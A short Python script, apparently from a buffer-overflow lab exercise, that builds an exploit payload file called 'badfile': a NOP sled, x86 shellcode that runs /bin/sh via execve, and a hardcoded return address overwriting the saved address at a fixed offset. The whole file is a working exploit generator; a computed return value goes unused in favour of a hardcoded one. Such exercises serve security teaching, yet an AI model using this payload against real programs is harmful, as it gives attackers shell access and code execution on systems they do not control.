#!/usr/bin/python

import sys



# Fill the content with NOP s
content = bytearray(0x90 for i in range(300))

# Putthe shell code at the end
start = 300 - len("\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80")
content[start:] = "\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"

# Put the address at the beginning
ret = 0xffffddb0 + 100
content[254:258] = "\x14\xde\xff\xff"

#Write the content to badfile
file = open("badfile", "wb");
file.write(content)
file.close()